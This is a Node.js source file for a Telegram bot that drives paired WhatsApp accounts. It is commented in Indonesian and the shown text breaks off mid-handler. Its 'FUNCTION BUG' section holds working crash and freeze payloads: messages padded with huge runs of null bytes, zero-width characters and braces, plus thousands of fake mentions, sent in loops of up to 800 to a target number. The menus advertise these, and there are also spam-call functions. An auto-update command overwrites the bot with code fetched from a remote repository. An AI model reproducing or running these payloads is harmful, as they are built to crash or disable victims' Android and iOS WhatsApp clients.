const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@zeppeliorg/wbails');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/zenitsu575/TripleVoid-Database/refs/heads/main/tokens.json";


async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.cyan(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ✅ Token Bot valid   
├─────────────────────────────┤
│ Developer : @aboutxyroozynzz
│@Zallceotelegram      
│
│ Thank You 🌊
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ ----- 🚀 Bot berjalan ----- ]
`
));
};
validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(phoneNumber, "XYROOIDGF");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomVideo() {
  const video = [
    "https://files.catbox.moe/bdsfwl.mp4",
  ];
  return video[Math.floor(Math.random() * video.length)];
}

const bagUrl = "https://files.catbox.moe/bdsfwl.mp4";
const ownerUrl = "https://files.catbox.moe/bdsfwl.mp4";
const bugUrl = "https://files.catbox.moe/bdsfwl.mp4";

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\

async function BebasSpam(sock, target) {
  try {
    const msg = {
      interactiveResponseMessage: {
        body: { text: "X" },
        nativeFlowResponseMessage: { paramsJson: "\u0000".repeat(100000) },
        contextInfo: { mentionedJid: Array(1900).fill("1@s.whatsapp.net") }
      }
    };

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg } }, {});
  } catch (err) {
    console.log(err.message);
  }
}

async function delayhard(sock, target, rtr = true) {
  const vojep = "𑇂𑆵𑆴𑆿".repeat(50000);
  const overfllws = "{".repeat(500000);
  for(let z = 0; z < 45; z++) {
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
              forwardingScore: 999999999,
              isForwarded: true,
              stanzaId: target,
              participant: target
            }, 
            body: {
              text: "7eppeli - Expos3d" + vojep,
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{"flow_cta":"${vojep}"}` + overfllws,
              version: 3
            }
          }
        }
      }
    }, {});
  
    await sock.relayMessage(target, msg.message, rtr ? { 
      messageId: msg.key.id, 
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: { status_setting: "all" },
        content: [{ tag: "mentioned_users", content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    } : { messageId: msg.key.id });
    
    await new Promise(r => setTimeout(r, 80));
  }
  
  console.log(`Sent To ${target}`);
}

async function DelayXFreeze(target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "VnF",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
}

async function bantendelayIOS(sock, target) {
  const overflowHeader = {
    interactiveResponseMessage: {
      header: {
        title: "\u0000" + "\u200D".repeat(5000)  // ZWJ berulang untuk overload renderer iOS
      },
      body: {
        text: "Banten"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        params: {
          json: "\u0000".repeat(3000) + "\u200C".repeat(3000)  // ZWNJ + null byte
        }
      },
      version: 3,
      entryPointConversionSource: "call permission_request"
    }
  };

  const secondPayload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
            ],
            body: {
              text: 'Banten' + '\u0000'.repeat(15000),  // Null byte panjang
              format: 'DEFAULT'
            },
            footer: {
              text: '\u200D'.repeat(30000),
              format: 'DEFAULT'
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(1200000)}}}`,
              version: 3
            }
          }
        }
      }
    }
  };

  
  for (let i = 0; i < 800; i++) {
    await sock.relayMessage(target, overflowHeader, {}).catch(() => {});
    await sock.relayMessage(target, secondPayload, { participant: { jid: target } }).catch(() => {});
    await new Promise(resolve => setTimeout(resolve, 10));
  }
}

//------------------------------------------------------------------------------------------------------------------------------\\

const keyboardIntervals = {};
const userMode = {};

// =======================
// 🎨 BUILD KEYBOARD
// =======================
function buildKeyboard(style) {
  return [
    [
      { text: "Xbugs", callback_data: "trashmenu", style },
      { text: "Xsettings", callback_data: "menu", style }
    ],
    [
      { text: "Developers", url: "https://t.me/aboutxyroozynzz", style }
    ]
  ];
}

// =======================
// 🎨 GET STYLE USER
// =======================
function getUserStyle(mode) {
  if (mode === "color_red") return "danger";
  if (mode === "color_green") return "success";
  if (mode === "color_yellow") return "primary";
  return "primary";
}

// =======================
// 💃 DISCO SYSTEM
// =======================
function startDisco(chatId, messageId) {
  stopDisco(chatId);

  const styles = ["primary", "danger", "success"];
  let index = 0;

  keyboardIntervals[chatId] = setInterval(() => {
    try {
      index = (index + 1) % styles.length;

      bot.editMessageReplyMarkup(
        { inline_keyboard: buildKeyboard(styles[index]) },
        {
          chat_id: chatId,
          message_id: messageId
        }
      ).catch(()=>{});
    } catch {}
  }, 2000);
}

// =======================
// 🛑 STOP DISCO
// =======================
function stopDisco(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}

// =======================
// 📤 KIRIM MENU BARU
// =======================
async function sendMenu(chatId, caption, keyboard) {
  const sent = await bot.sendVideo(chatId, getRandomVideo(), {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });

  return sent.message_id;
}

// =======================
// 🎨 MENU WARNA
// =======================
function colorMenu() {
  return {
    inline_keyboard: [
      [
        { text: "🔴 Merah", callback_data: "color_red" },
        { text: "🟢 Hijau", callback_data: "color_green" }
      ],
      [
        { text: "🟡 Kuning", callback_data: "color_yellow" },
        { text: "💃 Disko", callback_data: "color_disco" }
      ]
    ]
  };
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// =======================
// 🚀 START
// =======================
bot.onText(/\/start/, async (msg) => {

  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : "User";

  stopDisco(chatId);

  await bot.sendVideo(chatId, getRandomVideo(), {
    caption: `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${username}
    
最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @aboutxyroozynzz

⫹⫺ Pemilik : @aboutxyroozynzz & @Zallceotelegram <tg-emoji emoji-id="5447249559149367631">🌲</tg-emoji>

⫹⫺ Support : 
— XyrooZynzz
— Paduka Zall
— Nexxaw <tg-emoji emoji-id="6098375676488848970">⭐</tg-emoji>

⫹⫺ Version : 1.0 <tg-emoji emoji-id="6098239916867588854">👾</tg-emoji>

Select the button 🌊</strong></blockquote>`,
    parse_mode: "HTML",
    reply_markup: colorMenu()
  });

});

// =======================
// ⚙️ CALLBACK
// =======================
bot.on("callback_query", async (query) => {

  if (!query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  const username = query.from.username ? `@${query.from.username}` : "User";

  if (query.id) bot.answerCallbackQuery(query.id).catch(()=>{});

  if (data !== "color_disco") stopDisco(chatId);

  let caption = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${username}
    
最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @aboutxyroozynzz

⫹⫺ Pemilik : @aboutxyroozynzz & @Zallceotelegram <tg-emoji emoji-id="5447249559149367631">🌲</tg-emoji>

⫹⫺ Support : 
— XyrooZynzz
— Paduka Zall
— Nexxaw <tg-emoji emoji-id="6098375676488848970">⭐</tg-emoji>

⫹⫺ Version : 1.0 <tg-emoji emoji-id="6098239916867588854">👾</tg-emoji></strong></blockquote>`;
  let keyboard = [];

  if (data.startsWith("color_")) {

    userMode[chatId] = data;

    await bot.deleteMessage(chatId, messageId).catch(()=>{});

    if (data === "color_disco") {
      const newMsgId = await sendMenu(chatId, caption, buildKeyboard("primary"));
      startDisco(chatId, newMsgId);
      return;
    }

    const style = getUserStyle(data);
    await sendMenu(chatId, caption, buildKeyboard(style));
    return;
  }

  if (data === "trashmenu") {

    caption += `<blockquote><strong>— 𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂 𝗕𝘂𝗴𝘀 𝗗𝗶𝗯𝗮𝘄𝗮𝗵 𝗜𝗻𝗶!

╔─═⊱ 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱
│ — /nexura » Delay Invisible Can Spam
│ — /vortex » Delay Hard Invisible
│ — /mavetrix » Freeze x Forclose
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>`;

    keyboard = [
      [
        { text: "Ios Bugs", callback_data: "trashmenu2" },
        { text: "Back", callback_data: "back" }
      ]
    ];
  }

  else if (data === "trashmenu2") {

    caption += `<blockquote><strong>— 𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂 𝗕𝘂𝗴𝘀 𝗗𝗶𝗯𝗮𝘄𝗮𝗵 𝗜𝗻𝗶!
╔─═⊱ 𝗜𝗢𝗦 🍎
│/boomer » Delay IOS
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>`;

    keyboard = [
      [
        { text: "Back", callback_data: "trashmenu" }
      ]
    ];
  }

  else if (data === "menu") {

    caption += `

<blockquote><strong>╔─═⊱ 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀
│ /addowner » 𝖬𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝖮𝗐𝗇𝖾𝗋
║ /delowner » 𝖬𝖾𝗇𝗀𝗁𝖺𝗉𝗎𝗌 𝖮𝗐𝗇𝖾𝗋
│ /addadmin » 𝖬𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝖠𝖽𝗆𝗂𝗇
║ /deladmin » 𝖬𝖾𝗇𝗀𝗁𝖺𝗉𝗎𝗌 𝖠𝖽𝗆𝗂𝗇
│ /addprem » 𝖬𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝖯𝗋𝖾𝗆𝗂𝗎𝗆
║ /delprem » 𝖬𝖾𝗇𝗀𝗁𝖺𝗉𝗎𝗌 𝖯𝗋𝖾𝗆𝗂𝗎𝗆
│ /setcd » 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺
║ /addsender » 𝖬𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝖲𝖾𝗇𝖽𝖾𝗋
│ /listbot » 𝖬𝖾𝗅𝗂𝗁𝖺𝗍 𝖲𝖾𝗇𝖽𝖾𝗋 𝖸𝖺𝗇𝗀 𝖮𝗇
║ /setcd » 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺
│ /pullupdate » Auto Update
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>`;

    keyboard = [
      [
        { text: "Back", callback_data: "back" }
      ]
    ];
  }

  else if (data === "back") {

    const mode = userMode[chatId] || "color_green";

    await bot.deleteMessage(chatId, messageId).catch(()=>{});

    if (mode === "color_disco") {
      const newMsgId = await sendMenu(chatId, caption, buildKeyboard("primary"));
      startDisco(chatId, newMsgId);
      return;
    }

    const style = getUserStyle(mode);
    await sendMenu(chatId, caption, buildKeyboard(style));
    return;
  }

  // fallback
  await bot.deleteMessage(chatId, messageId).catch(()=>{});

  if (!keyboard || keyboard.length === 0) {
    keyboard = [[{ text: "Back", callback_data: "back" }]];
  }

  await sendMenu(chatId, caption, keyboard);

});


//–––––––TOLLS AUTO UPDATE––––––––//
// Auto Update
const Owner = "zenitsu575";           // username GitHub
const Repo = "autoUpdate";           // nama repository
const BranchPath = "main/"; // branch + path file (contoh: main/index.js)

const DEFAULT_RAW_URL = `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`;

const BOT_FILE = path.join(__dirname, 'index.js');
const BACKUP_FILE = path.join(__dirname, 'index.js.bak');

async function downloadFile(url, outputPath) {
  const writer = fs.createWriteStream(outputPath);
  const response = await axios({
    method: 'get',
    url: url,
    responseType: 'stream',
  });
  response.data.pipe(writer);
  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

bot.onText(/\/pullupdate/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk owner bot.', { parse_mode: 'Markdown' });
  }

  await bot.sendMessage(chatId, '🔄 *Memulai update dari repo...*', { parse_mode: 'Markdown' });
  await bot.sendMessage(chatId, `📦 Repo: \`${Owner}/${Repo}\`\n📁 File: \`${BranchPath}\``, { parse_mode: 'Markdown' });

  try {
    // Backup file lama
    if (fs.existsSync(BOT_FILE)) {
      fs.copyFileSync(BOT_FILE, BACKUP_FILE);
      await bot.sendMessage(chatId, '✅ Backup file lama berhasil (index.js.bak)');
    }

    // Download file baru
    await bot.sendMessage(chatId, '📥 Mengunduh file baru dari GitHub...');
    await downloadFile(DEFAULT_RAW_URL, BOT_FILE);
    await bot.sendMessage(chatId, '✅ File baru berhasil diunduh.');

    // Restart bot
    await bot.sendMessage(chatId, '♻️ Bot akan *restart* dalam 3 detik...', { parse_mode: 'Markdown' });
    setTimeout(() => {
      process.exit(0);
    }, 3000);

  } catch (error) {
    console.error('Update error:', error);
    await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}\n\nMengembalikan ke versi sebelumnya...`);

    if (fs.existsSync(BACKUP_FILE)) {
      fs.copyFileSync(BACKUP_FILE, BOT_FILE);
      await bot.sendMessage(chatId, '✅ Versi sebelumnya dipulihkan.');
    }
  }
});


//=======CASE BUG=========//
bot.onText("nexura", async (msg, match) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /nexus 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
